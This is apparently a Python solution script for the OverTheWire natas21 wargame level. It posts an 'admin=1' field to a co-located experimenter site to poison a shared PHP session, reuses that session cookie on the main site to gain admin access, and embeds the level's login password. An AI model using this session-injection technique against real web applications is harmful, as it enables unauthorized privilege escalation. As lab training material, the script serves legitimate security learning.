import requests
from pathlib import Path

url = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php'
url2 = "http://natas21.natas.labs.overthewire.org/index.php"
username = 'natas21'
password = '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'


auth = (username, password)
CURR_DIR = Path(__file__).absolute().parent


def save_html(name: str, data: str):
    path_to_html = CURR_DIR / "html" / f"{name}.html"
    if not path_to_html.parent.exists():
        path_to_html.parent.mkdir(parents=True)
    path_to_html.write_text(data)

res = requests.post(url, auth=auth, params={"debug":'1'}, 
                    data={"submit": '1', 'admin': '1'})
res = requests.get(url2, auth=auth, 
                   params={"debug": '1'}, 
                   cookies={"PHPSESSID": res.cookies['PHPSESSID']})
save_html("solution", res.text)
